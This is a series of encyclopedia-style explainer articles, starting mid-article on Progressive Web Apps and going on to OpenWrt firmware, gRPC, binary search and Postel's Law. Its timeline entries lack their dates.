Shell is served first to the user while JavaScript downloads and displays dynamic content to complete the view .
SPAs can now benefit by adopting PWA to precache content , sync to dynamic content in the background and reuse content from cache .
This means that SPAs are fundamentally unchanged but they are powered by PWA best practices to give better user experience .
In fact , SPAs usually load only data and render it on the client side .
With PWA , server - side rendering is preferred .
Client - side rendering should be kept minimal to improve the user experience .
Some claim that you need an SPA to build a PWA .
In other words , a site that already has an app - like interface will be easy to transition to PWA .
However , Condé Nast makes the point that it 's perfectly possible to build a PWA without it being an SPA .
What is the browser and platform support for PWA ?
Since PWA is based on web standards , developers need to consider support for those standards .
This would include parsing a manifest file , adding to the homescreen , supporting service workers and so on .
As of November 2017 , Google Chrome and Mozilla Firefox support it but Safari does n't .
Jake Archibald maintains current support for service workers in browsers .
There 's no consensus on menu items such as " Add to Homescreen " , which may be phrased differently in each browser .
Where cross - browser support is lacking , a native mobile app may be better than a PWA .
It 's also been suggested that having an app as PWA plus native or hybrid variants may give users more choice .
React , Preact , Angular and Vue.js are some examples of platforms that have support for service workers and app manifest file generation .
Are there good examples of PWA ?
A curated list of ten PWA apps includes Ali Express , Flipkart Lite , Wego , Trivago , Flipboard and Telegram .
Flipkart Lite is an e - commerce app from India .
Air Berlin allows for online check - in and displays cached boarding cards in offline mode .
Twitter , Lyft , Uber and Starbucks are some big names that have taken the PWA route .
Other PWA examples include Wired , The Washington Post , The Guardian , The Weather Company , Forbes and Financial Times .
AirHorner showcases PWA capabilities well .
Has PWA proven itself in the real world against web apps and native mobile apps ?
Here are some success stories : Twitter Lite , built as a PWA with React and Node.js , has achieved a 75 % increase in tweets and reduced data usage by as much as 70 % .
Google PWA install banners have 5 - 6x more conversions than native install banners .
The Weather Channel achieved 80 % faster loading with PWA .
Lancôme 's PWA version of its e - commerce site gave an 84 % decrease in time to interaction and a 17 % increase in conversion .
India 's MakeMyTrip saw conversion rate triple and a 160 % increase in shopper sessions .
Alibaba 's PWA has brought a 76 % rise in conversions and a four times higher interaction rate .
Forbes has seen a 100 % increase in session duration and more 43 % more sessions per user .
Is PWA only for the mobile world ?
No .
PWA can be used to enhance the desktop experience as well .
Samsung DeX is an example of this .
While Chrome for Android supports PWA , the desktop version of Chrome will also start supporting PWA in 2018 .
If we consider VR experiences within a browser using WebVR , PWA can enable these on mobile as well as desktop .
It has become possible to bookmark web apps to the homescreen .
The web app manifest is now a JSON file allowing us to specify the app name , icon and how the app should be launched .
This implies that we no longer need to give configuration in the ` head ` part of the HTML page .
Chrome started supporting service workers .
Google engineer Alex Russell explains PWA .
Google announces PWA .
Mozilla announces that it will embrace PWA , starting first with Android .
Firefox has supported service workers and push notifications since 2016 .
OpenWrt Logo .
Source : Wikipedia , 2015 .
OpenWrt is a Linux - based customizable operating system for embedded devices .
Instead of being a static firmware , it 's a flexible Linux distribution that allows applications to be added / removed through a package management system without having to rebuild the entire firmware .
OpenWrt started as a means to give users and developers control over router firmware .
The suffix " WRT " itself comes from Wireless RouTer .
Today , OpenWrt can be used in various embedded devices , including Wi - Fi routers , wired routers , residential gateways , smartphones , laptops and even x86-based PCs .
Why should I use OpenWrt ?
OpenWrt intro , installation and configuration .
Source : Brownell 's Tech Tips , 2016 .
Hardware manufacturers normally ship their products with their own firmware .
However , such a firmware may be unstable or lack the features that you desire .
One Reddit user noted many problems with the default firmware : broken port forwarding , security flaws , missing IPv6 support , limited routing support , no patches , no SSH access , etc .
Manufacturers may not bother patching old device models .
Their firmware may also have government backdoors .
This is where OpenWrt comes in as a suitable alternative .
Users can download pre - built binaries and customize the same with necessary packages .
Developers can build firmware from source and develop new packages .
The code is open source and is maintained by a community of developers .
Because the source is open , OpenWrt is a useful tool for students and researchers .
Moreover , one can get enterprise - class features by installing OpenWrt on cost - effective hardware .
As of January 2017 , OpenWrt is supported by close to 700 different models across brands .
In February 2011 , OpenWrt had about 2000 packages .
In 2017 , this number was 3500 .
How are people customizing OpenWrt for their routers ?
With OpenWrt , users / developers can use their router to run a BitTorrent client , enable VPN , create a guest Wi - Fi network , analyze network traffic , do traffic - shaping or apply QoS rules on packets .
The router can also run servers : SSH ( and do SSH tunneling ) , IRC server , HTTP server , FTP server , etc .
Mesh networking , port knocking , firewalling , wireless bridging , file sharing and real - time monitoring are some other useful features .
When configured as a public hotspot , OpenWrt provides a number of functions to manage the hotspot .
OpenWrt can also connect to printers , webcams , modems and soundcards .
In general , an OpenWrt device can work with any hardware that has Linux support .
Could you share some technical details of OpenWrt ?
OpenWrt compared against desktop Linux and Android .
Source : OpenWrt Wiki , 2016 .
OpenWrt is a Linux distribution but because it 's optimized for embedded systems , many of the libraries have been customized .
uClibc is the C standard library used .
Utilities from BusyBox are used , though procd has replaced some of them for process management .
For package management , OPKG is used .
It 's been claimed that a stripped version of OpenWrt can run with only 8 MiB of main memory and non - volatile storage of 2 MiB. The firmware is composed of image ( kernel + rootfs ) and optional packages .
Linux , BSD or MacOS are recommended for the host system building the firmware .
Robbie Cao has shared a detailed discussion of OpenWrt 's build process , installation , configuration , package mangement system , boot up sequence and memory layout .
What are some open - source alternatives to OpenWrt ?
Many of the alternatives themselves are derived from OpenWrt : LEDE , Gargoyle , Fon , libreCMC , Freifunk , LibreMesh , etc .
Other alternatives include DD - WRT , pfSense , ClearOS , Tomato ( and its derivatives ) , LibreMesh , telehash , Gluon and OpenWISP .
FreeWRT and Chilifire are also available .
While OpenWrt is more of a customizable Linux distribution , DD - WRT is a monolithic build .
OpenWrt takes a little more work than DD - WRT for the user , but OpenWrt has more features .
The tomato is lightweight and strikes a balance between performance and features .
However , it supports fewer device variants , unlike DD - WRT .
DD - WRT is claimed to be the most popular open source router firmware .
Are there any concerns about using OpenWrt ?
Flashing your router with OpenWrt will void the manufacturer 's warranty .
In some exceptional cases , due to incompatibility , the device may become unusable ( bricked ) after loading OpenWrt .
If the device has a button to revert to factory settings , this could be an option to recover it .
In any case , flashing a replacement firmware should be avoided via a wireless link .
Also , ensure the availability of uninterrupted power supply during the process .
Some routers using open source firmware have been blamed for using 5 GHz spectrum without using Dynamic Frequency Selection ( DFS ) .
As a result , they interfere with weather radar systems .
Since June 2016 , in the US , devices are required to operate within allowed bands , modulations and power levels .
Some manufacturers , such as TP - Link , took the easy path of preventing the use of open source firmware while Linksys still allows them with necessary checks .
Some have claimed that one can boost power levels with open source firmware .
However , if done wrongly , this may violate local limits and regulations .
What tools are available to build , install or configure OpenWrt and its packages ?
The development and building environment is called OpenWrt Buildroot , which is derived from the Buildroot system .
This allows developers to cross - compile for different target architectures and automate the build process using makefiles and scripts .
OpenWrt SDK is needed to build userspace packages .
We can download a pre - built SDK or build one ourselves .
Package manager OPKG is used to install / remove / update pre - built packages .
If we are building a custom package , OpenWrt SDK can also be used to manage the package .
Configuration is centralized via Unified Configuration Interface ( UCI ) .
We can configure OpenWrt from a command console or from a web interface named LuCI .
Alternative web interfaces include X - Wrt and Gargoyle Router Management Utility .
LuCI includes a package manager page .
In fact , some packages have their own configuration pages in LuCI .
As a developer , how can I contribute to OpenWrt ?
A technical overview of OpenWrt / LEDE .
Source : Fainelli , 2017 .
OpenWrt is completely open - source and community - driven .
It 's released under the GPL v2.0 license .
The code is available on GitHub .
You can either contribute to the main distribution or to the various community - maintained packages .
The documentation is on OpenWrt Wiki .
Tasks for developers typically include the following : Update the Linux kernel to more recent versions Fix bugs in the kernel or packages : These may include security fixes Update drivers and networking protocols Support new hardware and new platforms Write new packages Participate in code reviews and testing Improve build , packaging and development tools Linksys releases router WRT54 G with support for IEEE 802.11 g standard .
Some folks in the open source community investigated the firmware and found that it uses open source Linux components .
Under pressure from the community , Linksys released the firmware source code in July 2003 .
This is the genesis of OpenWrt , and custom router firmware in general .
Sveasoft 's Alchemy and Talisman , and BrainSlayer 's DD - WRT are based on this firmware .
The OpenWrt project has started .
The first version was released the same year using Linksys open source firmware for the Linksys wireless router WRT54G. LuCI project was started to provide a web user interface for embedded devices .
It 's based on the Lua programming language .
OpenWrt adopts this interface in the Kamikaze 8.09 release .
Today , the LuCI source code is part of OpenWrt .
The OpenWrt Summit is organized for the first time to discuss OpenWrt technology and support the movement .
It happens in Dublin , Ireland .
Chaos Calmer 15.05.1 has been released .
This is a maintenance release on Chaos Calmer 15.05 released in September 2015 .
Note that the number " 15.05 " indicates that the release branch was created in May 2015 , although the release was finalized only in September .
The next OpenWrt release named " Designated Driver " is under development .
Linux Embedded Development Environment ( LEDE ) was born as a fork of OpenWrt .
LEDE was started by many active OpenWrt developers unhappy with OpenWrt 's processes and lack of transparency , among other things .
LEDE promises more open communication , liberal merge policy , automated testing , simplified release process , predictable release cycles and simple infrastructure that requires little maintenance .
OpenWrt and LEDE projects meet and plan for a merger .
The OpenWrt code was replaced by a code from LEDE as part of efforts to merge the two under the original brand name of OpenWrt .
Tightly integrated monolithic applications of the past gave way to modular design .
With the growth of the Internet , different parts of an application can reside on different servers and be accessed over the network using what is called Remote Procedure Call ( RPC ) .
With the advent of cloud computing , applications are composed of microservices .
These microservices are loosely integrated but their interfaces are precisely defined using APIs .
gRPC is a framework that enables the implementation of highly scalable and performant application whose parts are distributed over a network .
The framework abstracts away the low - level networking details from app developers so that they can focus on the application logic .
Developers need not worry about how one part calls a functionality in another remote part .
gRPC takes care of this and enables more responsive real - time apps .
gRPC is a recursive abbreviation that expands to gRPC Remote Procedure Call .
How has gRPC come about ?
Since the 1990s , networking has played an important part of computing infrastructure .
In distributing computing , one computer can trigger an action on another remote computer .
CORBA , DCOM and Java 's Remote Method Invocation(RMI ) were used to make this possible .
As the web matured in the early 2000s , RPC methodology started relying more and more on HTTP , XML , SOAP and WSDL .
The idea was to use standardized technologies for interoperability regardless of languages or platforms .
With Web 2.0 and cloud computing , HTTP / XML / SOAP combination was replaced with HTTP / JSON , which resulted in REST .
Cloud applications are composed of microservices and these are communicated via REST APIs .
More recently , smartphones and IoT devices are invoking these microservices .
These devices have limited compute power , communication bandwidth or both .
In such cases , HTTP / JSON with REST is seen as an inefficient approach .
gRPC solves this problem .
In fact , back in 2016 , within its data centers , Google made about 100 billion RPC calls per second .
At that scale , Google calling REST APIs would have been inefficient .
What are the essential elements of gRPC ?
One way to summarize gRPC is that it 's a lean platform using a lean transport system to deliver lean bits of code .
gRPC is the platform .
HTTP/2 is transport .
Protocol Buffers deliver lean bits of code .
Together , they reduce latency and improve efficiency .
GRPC depends on HTTP/2 .
HTTP/2 supports bidirectional streaming , flow control and header compression .
Moreover , multiple requests can be sent over a single TCP connection .
When distributed parts of an application need to communicate with one another , data needs to be serialized .
Protocol Buffers are used as the Interface Definition Language ( IDL ) to specify both the service interface and the structure of the payload messages .
Thus , the specification is developer - friendly .
In addition , data is sent on the wire in an efficient binary format .
The encoding and decoding is transparent to the developer and done automatically by the framework .
gRPC is about services and messages , not objects and references .
The gRPC is language agnostic : developers can use any programming language .
The gRPC is payload agnostic : the use of Protocol Buffers is not required .
gRPC provides authentication out of the box .
What are the benefits of using a gRPC ?
gRPC outperforms REST on many metrics .
Source : Howden 2017 , slide 41 .
In the world of the RESTful JSON API , there can be problems with version incompatibility : the API has changed at the server , and the client is using an older version .
Writing a client library along with authentication is also extra work .
The use of HTTP/1.1 is also a poor fit for streaming services .
Because JSON data is textual , it takes more bandwidth .
It also takes more work to encode and decode JSON .
With gRPC , both client and server code are generated by the compiler .
gRPC comes with language bindings for many popular languages .
The use of Protocol Buffers solves the efficiency problem of JSON .
Bidirectional streaming is possible and authentication is part of the framework .
Protobuf ensures backward compatibility and offers validation and extensibility .
Protobuf provides static / strong typing that REST lacks .
This minimizes the overhead of encoding .
Compared to other RPC frameworks , gRPC speaks the language of the web ( HTTP/2 ) , comes with multiple language bindings , and therefore makes it easier for developers .
What are the different gRPC life cycles ?
Language and platform agnostic gRPC requests and responses .
Source : Janakiram MSV 2016 .
gRPC life cycles include : Unary : This is the simplest one .
When a client calls a server method , the server is notified with client metadata for this call , method name and deadline .
The server may respond with its own metadata or simply wait for the client 's request message .
Once a request is received , the server will execute the method , then send a response and status code to the client .
Server Streaming : Similar to the unary case , except that the server sends a stream of responses .
Client Streaming : Similar to the unary case , except that the client sends a stream of requests .
The Server need not wait for all requests before sending a single response .
Bidirectional Streaming : This starts with a client request but subsequently , client and server can read or write in any order .
Each stream operates independent of the other .
It 's really application dependent .
gRPC calls can be either synchronous or asynchronous .
Since networks are inherently asynchronous , asynchronous calls are recommended so that the current thread is not blocked .
Where does gRPC fit within the communication stack ?
gRPC is the framework that glues the apps with the transport layer below .
Source : Pai 2016 , slide 18 .
gRPC is the framework layer that interfaces with the transport layer below and with the application layer above .
In fact , gRPC makes it easier for application developers to make RPC calls over the network since the framework abstracts away all the low - level network operations .
By using HTTP/2 for transport , the gRPC benefits from all the performance enhancements that HTTP/2 offers over HTTP/1.1 .
Developers can write apps in any language of their choice .
To ease the job of calling framework APIs , gRPC provides language bindings in many popular languages .
The core of gRPC is implemented in C for performance reasons .
These language bindings are therefore wrappers over the low - level C API .
Finally , application code can be fully hand - written but it 's possible to generate boilerplate code based on message definitions .
For example , if we use protobuf for data serialization , the protobuf compiler can be used to generate request / response and client / server classes .
The developer can therefore focus on writing her application to invoke the methods of these generated classes .
What are some myths surrounding gRPC ?
Here are some myths about gRPCs : gRPCs work with only microservices : gRPCs can be used in any distributed app that needs to communicate over the network .
gRPC depends on protobuf : Protocol buffers are used by default , but any other suitable data serialization protocol can be used depending on specific app requirements .
JSON could be useful when data must be human readable or data needs to be directly consumed by a web browser .
gRPC will replace REST : This may happen in the future , but right now both will probably coexist and even interwork .
I prefer REST for interoperability and gRPC for performance .
It 's easy to directly consume REST APIs with tools such as curl , but gRPC tooling may be improved to offer similar functionality .
gRPC is only for server - side communications : Web browsers can also use gRPC .
grpc - web is one project that enables this .
gRPC core is implemented in C : C is the default implementation , but there are implementations in Go , Java , Swift , Dart and JavaScript .
If I 'm developing a gRPC service , what 's the recommended workflow ?
A typical gRPC development workflow for developers .
Source : Jain 2017 .
First , you define the service methods and data using an IDL of your choice .
Protocol Buffers is one possible choice for IDL .
Definitions are stored in ` * .proto ` files .
The next step is to invoke the ` protoc ` compiler to generate code in languages of your choice .
Many languages are supported as of June 2018 : C++ , Java , Python , Go , Ruby , C # , Node.js , Android Java , Objective - C , PHP and Dart .
On the client side , gRPC functionality is implemented in what 's called a stub .
Your app code can call into methods of the stub along with local objects as arguments .
gRPC will translate the calls to gRPC requests to the server along with binary serialized protobuf .
How do I migrate my REST API - based web service to gRPC ?
grpc - gateway generates a reverse - proxy server which translates a RESTful JSON API into gRPC .
Source : grpc - ecosystem GitHub 2018 .
Migrating a service to gRPC overnight might break many clients still using REST APIs .
It 's therefore recommended to have a transition period in which REST and gRPC services are both operational .
Even in the long term , it might be a good idea to redirect REST calls to gRPC .
Project grpc - gateway is a way to generate reverse proxy code .
grpc - gateway works as a plugin for protobuf compiler .
The reverse proxy will then translate RESTful JSON API into gRPC method calls .
Within Google Cloud , transcoding HTTP / JSON to gRPC happens via what is called Extensible Service Proxy ( ESP ) .
This is enabled by adding annotations in your ` * .proto ` files or separately in YAML files .
Who 's been using gRPC in the real world ?
gRPC has been adopted by CoreOS , Netflix , Square , Cockroach Labs and etc .
Telecom companies Cisco , Juniper , and Arista are using it for streaming telemetry data and network configurations .
Docker 's containerd exposes functionality via gRPC .
Square moved from a proprietary RPC framework to gRPC and they have shared their experience on YouTube .
Lyft has used gRPC along with Envoy .
For some services , they used a Go implementation of gRPC .
For others , they used Flask - Python with gevent , which did n't work well with gRPC .
Hence , they used Envoy to bridge gRPC with HTTP/1.1 while using protobuf .
Could you share some performance numbers of gRPC ?
Performance of gRPC / Protobuf vs HTTP1.1 / JSON .
Source : Adapted from Schapira and Sethuraman 2016 .
A benchmark test on Google Cloud using 9 gRPC channels compared gRPC performance versus HTTP1.1 / JSON .
gRPC achieved 3x throughput using only a fourth of the resources .
On a per CPU basis , this was 11x the HTTP1.1 / JSON throughput .
This improvement is due to protobuf in which data is kept and transmitted in binary without involving any Base64 or JSON encoding / decoding .
In addition , HTTP/2 can multiplex requests on a single connection and apply header compression .
Another test involving 300 K requests of key / value stores in etcd showed that JSON took 1.6ms , single - client gRPC took 122.4&micro;s and 100-client gRPC took 12.9&micro;s .
Memory usage per operation dropped by 44 % .
When comparing single - client and 100-client gRPC cases , the latter ran at one - fifth the time because multiple requests go on a single TCP connection .
When sending files over gRPC , it 's been shown that plain HTTP/2 is faster because there 's no encoding or decoding ; it 's just raw data transmission .
How does gRPC compare against other RPC frameworks ?
When comparing different RPC frameworks , gRPC 's deserialization can be slow compared to Cap'n Proto .
Within gRPC , a C++ implementation is faster than one in Java , Go or Python .
It should be noted that performance depends on the message complexity .
Another benchmark test showed that gRPC is n't the fastest .
Cap'n Proto , rpclib and Thrift all perform better , with Cap'n Proto being the best for deeply nested message structures .
This could be because gRPC forgoes the zero - copy approach that Cap'n Proto or Flatbuffers use .
Instead , gRPC aims to encode data for smaller bandwidth requirements at the expense of extra CPU computation .
Thrift and gRPC both support code generation and serialization .
However , Thrift does n't use protobuf or HTTP/2 .
While REST+JSON API is n't an RPC , Swagger is a tool that supports API design and code generation .
gRPC alternatives in Java are many .
Some developers might find it useful to study the implementation of different RPC mechanisms .
Developer Renato Athaydes claims that gRPC does n't work well with JVM types and hence provides his own version of RPC based on Protocol Buffers .
The initial version of Protocol Buffers has been released .
Version 1.0 of Protocol Buffers ( internal to Google ) inspires the design and implementation of version 2.0 , often called proto2 .
Profocol Buffers are also called protobufs .
Version 3.0-alpha of Protocol Buffers ( proto3 ) is released .
A stable version 3.0.0 was released in July 2016 .
This development parallels that of gRPC .
Google releases and open sources gRPCs based on its vast experience in building distributed systems .
Google states that they 're starting to expose most of their public services via gRPC endpoints .
GRPC uses HTTP/2 .
Meanwhile , the Internet Engineering Steering Group ( IESG ) approved HTTP/2 as a proposed standard .
In May 2015 , HTTP/2 was published as RFC 7540 .
The gRPC itself is influenced by Stubby , an earlier RPC framework used by Google internally .
Google releases V1.0 of gRPC with improved usability , interoperability , and performance measurement .
This version is now considered stable and production ready .
Language support includes C++ , Java , Go , Node , Ruby , Python and C # across Linux , Windows , and Mac ; Objective - C and Android Java on iOS and Android .
Cloud Native Computing Foundation ( CNCF ) adds gRPC to its portfolio .
This means that CNCF will host and guide the development of gRPC .
Comparing binary search against sequential search .
Source : Johnson 2015 .
Binary search is an algorithm for efficiently searching for an item within a sorted list of items .
The search is done in steps , with each step reducing the search space by half ( with linear or sequential search the search space is reduced by only one item ) .
At each step , the midpoint is selected and compared against the search value .
If the midpoint is less than the search value , only the upper half is retained for the next step .
When formulated in a more abstract way , binary search can be used to solve optimization problems with the use of binary predicates .
Whenever the predicate is evaluated , the algorithm will retain only half the search space where the predicate is true .
In this case , binary search can be seen as " searching " for an optimum solution rather than searching for a specific item .
How can we derive the complexity of binary search ?
The Logarithmic function grows a lot slower than linear functions .
Source : Popov 2015 .
Given a list of \(n\ ) items , linear search is of complexity \(O(n)\ ) .
Binary search has a complexity of only \(O(log_{2}n)\ ) .
For comparison , linear search on a list of 1000 items may take on average 500 steps and 1000 steps in the worst case .
The same with binary search will only take about \(log_{2}1000\approx10\ ) steps .
A video tutorial by GeeksQuiz explains how to derive this complexity .
Briefly , since each step reduces the search space by half , and given that \(k\ ) steps are required , this implies \(n=2^k\ ) , which translates to \(k = log_{2}n\ ) .
Binary search is said to take the divide - and - conquer approach .
The computational complexity described above is in terms of the number of steps to complete the search .
An optimized implementation would use only one comparison per step .
Algorithms also take up memory to manage operations .
The space complexity of binary search is \(O(1)\ ) , which means that it is constant and independent of \(n\ ) .
What are the prerequisites for applying binary search ?
Binary search can be applied only under the following conditions : List is sorted : Since half the search space is discarded based on a midpoint value comparison , binary search works only on a sorted list .
Random access is possible : Binary search maintains the boundaries of the search space in terms of left and right indices .
The midpoint is calculated based on these indices .
To access the value of the current midpoint item , the item must be accessible by its index .
This works nicely with data structures that support indexing , such as arrays ( C , Java ) and lists ( Python ) .
Using binary search on a data structure such as a linked list is wasteful since we need to traverse the list item by item to get to the midpoint .
Size : Size of the search space must be known .
If my array is unsorted , what search should I use ?
There are two approaches : sort the array first and then apply binary search ; or simply apply linear search .
The question is which of these two is faster .
Let 's use a fast sorting algorithm such as mergesort .
This has a complexity of \(O(n\,log_{2}n)\ ) .
Linear search has a complexity of \(O(n)\ ) .
Since \(O(n\,log_{2}n ) > O(n)\ ) , using linear search is better .
This also implies that if your application does frequent updates to the list , avoid binary search since keeping the list in sorted order can reduce performance .
Can we do a 3-way or even n - ary search for faster results ?
Every comparison is between two alternatives , hence binary in nature .
To decide among three alternatives , we would need two comparisons anyway .
A binary search is therefore superior since with two comparisons it can handle \(2^{2}=4\ ) alternatives .
The same argument works for n - ary search .
An alternative explanation is available from Geeks For Geeks .
When the distribution of data is known and the lists are large , then interpolation search can do better than binary search .
Hash tables are faster because they maintain a map of key - to - value .
However , binary search is more versatile since it can be used to solve optimization problems as well .
Can you give an example of binary search to solve optimization problems ?
TopCoder gives an example called FairWorkload .
There are \(n\ ) filing cabinets each with a variable number of folders and \(k\ ) available workers to process the folders .
Each worker must be assigned one or more contiguous filing cabinets to process .
Under the constraint of worker availability , how many workers do we need so that the workload is most evenly distributed while minimizing the number of folders each worker processes ?
This can be solved using binary search .
The search space is the number of folders per worker .
The predicate can be stated as , " Can the workload be spread so that each worker has to examine no more than x folders , with the limited number of workers available ?
" With each step , we can calculate the number of workers required for a certain maximum number of files per worker .
If this number is less than or equal to \(k\ ) , it implies that we can move the upper limit to the current midpoint .
Another example is to find the minimum of a mathematical function .
Another example is to find the square root of a real number .
How is binary search different from binary search tree ?
Illustration of a binary search tree .
Source : Johnson 2015 .
Binary search is an algorithm .
A Binary search tree is a data structure .
Other than this fundamental difference , both share the same principle in terms of searching for an item .
Search complexity is logarithmic in time .
With the binary search tree , each node in the tree has a left and a right branch for items of lesser and greater value respectively .
This means that when the tree is searched , half the search space is discarded either to the left or right .
However , a tree that 's not balanced can result in worse performance .
Even a balanced binary search tree is not necessarily optimal for searching compared to binary search .
Unlike binary search , binary search trees ca n't be used to solve optimization problems .
Binary search trees also take up more space compared to sorted arrays .
Binary search trees have the advantage that insertion and deletion of items are also logarithmic in time , unlike sorted arrays where such operations are of complexity \(O(n)\ ) .
Should we implement binary search iteratively or recursively ?
For algorithms in general , there 's no general rule that one is better than the other .
Sandeep Gupta shows an example where recursive implementation is easier to read .
With respect to binary search , for large arrays , recursive code can lead to stack overflows .
Likewise , recursive code can be slower due to the extra function calls .
However , if the code can be refactored to tail recursive , speed and stack problems can be overcome with tail - call optimization .
Which one to adopt might ultimately be a matter of personal choice for developers .
Adopt one that 's easier for you to understand .
There 's nothing worse than a recursive code that does n't have a proper terminating condition and hence goes into infinite recursion .
What are the variations of binary search ?
Variations include the following : Uniform binary search Boundary search Fibonacci search Exponential search Interpolation search Fractional cascading What are the usual challenges for implementing binary search ?
A typical binary search maintains the left and right indices of the search space and calculates the midpoint .
For the next step , these indices and midpoints are adjusted .
If one is not careful , the search item may be on the boundary and may get missed out due to " off - by - one " error .
Do n't overconstrain the bounds .
Relax them while adhering to the predicate .
Also , when calculating the midpoint , take care that overflow and truncation errors are avoided or handled correctly .
Always test for corner cases .
Will the code work for odd and even number of list items ?
Will it work for 1-item or 2-item lists ?
How will it behave if there are duplicate entries of the search term ?
Will it exit cleanly if the search term is not found ?
Does it work correctly when searching for real numbers ?
With real numbers , match of the search term should be based on either the number of steps or the relative difference between steps .
Avoid using absolute differences , since precision is limited when numbers are large .
If a recursive implementation is used , be aware of how many recursive calls will be possible due to stack space limits .
Can you give examples of overflow and truncation errors ?
When calculating the midpoint of a large array , indices may be large values .
Thus , ` mid = ( lo + hi)/2 ` may result in an overflow .
Change this to ` mid = lo + ( hi - lo)/2 ` .
On a 2-element array , with lo=0 and hi=1 , the midpoint will remain at 0 due to truncation .
If the match is at index 1 , this will result in an infinite loop .
The correct code in such a case would be ` mid = lo + ( hi - lo+1)/2 ` .
What support do we have from languages to use or implement binary search ?
While it 's possible to do one 's own implementation , many languages provide libraries that simplify implementation : C++ Standard Template Library : lower_bound , upper_bound , binary_search , equal_range Java : Arrays.binary_search .NET Framework : Array .
BinarySearch Python : bisect John Mauchly mentions binary search in what is probably the first published reference .
D.H.Lehmer publishes a method that can handle any \(N\ ) , not just \(N=2^{n}-1\ ) .
H.Bottenbruch changes the algorithm so that comparisons are reduced at the expense of extra iteration .
A.K.Chandra of Stanford University suggests the uniform binary search .
Attributes of Postel 's Law .
Source : Tilkov 2015 , slide 36 .
Postel 's Law was formulated by Jon Postel , an early pioneer of the Internet .
The Law was really a guideline for creators of software protocols .
Computers use protocols to communicate with one another on the Internet .
The idea was that different implementations of the protocol should interoperate .
The law is today paraphrased as follows : Be liberal in what you accept , and conservative in what you send .
Although first stated with reference to TCP / IP , the law has been applied in other areas , from the parsing of HTML to the acceptance of user inputs .
The growth and success of the Internet has been attributed in part to this law .
However , its use in modern systems has been questioned .
It 's been suggested that following the law is harmful from the perspective of maintainability , compatibility and security .
Postel 's Law is also known as the Robustness Principle .
Could you explain Postel 's Law ?
The spirit of Postel 's Law is to make different implementations interoperate .
There are two parts to the law and these are briefly explained in RFC 760 : Conservative in sending : Protocol should be careful to send well - formed datagrams .
Liberal in receiving : Protocol should accept any datagram that it can interpret .
In other words , if the semantics are clear , then errors in syntax can be overlooked .
Herb Bowie calls it , " a general social code for software : be strict in your own behavior , but tolerant of harmless quirks in others .
" In a more general sense , the Law is about reducing variations in input and giving a more well - defined and easily understood output .
Robustness comes because chaos at the input is managed to result in a cleaner output .
Can you give examples of Postel 's Law in action ?
Protocol example of Postel 's Law .
Source : Allman 2011 .
Here are some examples where the law allows the system to continue functioning rather than break down with a fatal error : If an incorrect type is received , cast it to the correct type .
If users enter whitespaces , trim them .
If arguments are invalid and your function is supposed to return an array , return an empty array .
If a closing HTML tag is expected but it 's missing , close it yourself .
Let 's take a protocol example in which if option A is present , field X has a value ; otherwise , X should be zero filled .
A conservative sender will be sure to zero fill X if A is absent .
Suppose the sender does n't bother doing this .
A liberal receiver will accept the packet even if X is not zero filled .
Suppose in version 2 of the protocol , option B is introduced .
B is applicable when A is absent .
B also sets the value of X. Due to the Robustness Principle , version 1 receivers will continue to accept packets sent by version 2 senders ( A absent , B present with X ) although they wo n't support B. Why was Postel 's Law so important for the early Internet ?
The Internet grew without centralized control .
When a protocol was defined , it was implemented by multiple individuals and teams .
For reliable communication , these different implementations are needed to understand one another .
However , standards are not always unambiguous .
Sometimes different interpretations arise .
In such cases , strict adherance to the standard will result in protocol errors .
In a distributed system , it would be hard to iron out these differences .
If there 's tight control , Postel 's Law is not needed .
But the Internet is many pieces loosely joined .
This is exactly why the law made sense .
In the early Internet days , implementations were liberal in accepting non - standard inputs provided they could make sense of them and decide how to handle them .
Without such a liberal approach , the growth of the Internet might have been slower than it was .
Without Postel 's Law , standardization and their strict implementations would have taken longer .
Implementations that interwork with one another were more important .
This is partly reflected in the ethos of the IETF that aims for " rough consensus and running code .
" A similar thing happened with browsers and HTML .
The Law made sense for the rapid growth of WWW .
In what aspects of a software system has Postel 's Law been applied ?
Applying Postel 's Law to user interfaces .
Source : Deep 2019 .
Networking protocols commonly used on the Internet ( such as TCP / IP , SNMP , FTP ) adhere to the Law to achieve interoperability .
When HTTP became popular in the 1990s , browsers applied the law liberally .
From a user experience perspective , it was better to parse and display as much of the content as possible rather than inform the user than the HTML page did not conform to specifications .
XML parsers on the other hand , are more strict about accepting malformed or invalid XML documents .
Nonetheless , some XML feed readers and aggregators from the 2000s were liberal .
The law has been applied to design systems .
When parsing user inputs , the law has been applied to deliver a better user experience .
It 's been used in UNIX command line utilities .
APIs and microservices have also applied to the law .
How does one apply Postel 's Law to APIs and microservices ?
Different services can run different versions and maintaining strict compatibility is a challenge .
However , the use of version for APIs can help achieve backward compatibility and avoid the situation of being too liberal in accepting invalid requests .
The law is equally relevant for consumers of API , who can be liberal and process only those fields of the response they are interested in and ignore extra fields .
Where client implementations are not liberal with responses , the server may apply counter measures .
In other words , the server responds in a less conservative manner so that client code does not break when the API is changed or upgraded later .
This is an example of applying the law selectively .
Are there problems with or exceptions to Postel 's Law ?
Liberal implementation or a software bug ?
Source : Mullican 2013 .
It 's been claimed that the law has no exceptions , even when it comes to XML parsing .
Others argue that XML documents have to be well formed and valid .
While the law is good for interoperability , it leads to incompatibilities .
There 's no agreement about how liberal an implementation needs to be .
Thus , HTML5 is a stricter specification than its predecessors .
RFC 2360 clarifies , " The sender accuses the receiver of failing to be liberal enough , and the receiver accuses the sender of not being conservative enough .
" One solution is to define standards in greater detail , particularly for the receiving end .
It should be clear when to be liberal .
There could be such a thing as being too robust .
RFC 3117 states that robustness is at odds with efficiency .
The Robustness Principles can create deployment problems because errors in new implementations will go undetected until they meet a not - so - liberal implementation .
Since errors are tolerated , over time they will become entrenched and make implementations more complex .
Thomson calls this the Protocol Decay Hypothesis .
It 's therefore better to expose these errors early on and let implementations fix them .
Can the Robustness Principle be called the Resilience Principle ?
Robustness is quite different from resilience .
A robust system attempts to avoid failure and thus incurs design complexity .
A resilient system attempts to discover problems early and focuses on recovery .
Equivalently , a robust system will continue to function without changing its essential nature .
A resilient system will continue to function by adapting itself .
Thus , it 's proper to call Postel 's Law as the Robustness Principle .
Vinton Cerf and Robert Kahn publish details of the Transmission Control Program ( TCP ) for use in packet - switched networks .
This protocol is the genesis of what later became the popular TCP / IP .
The IETF released two documents , RFC 760 ( Internet Protocol ) and RFC 761 ( Transmission Control Protocol ) .
This is the beginning of TCP / IP .
Jon Postel , editor of both RFCs , mentions in RFC 760 , " an implementation should be conservative in its sending behavior , and liberal in its receiving behavior .
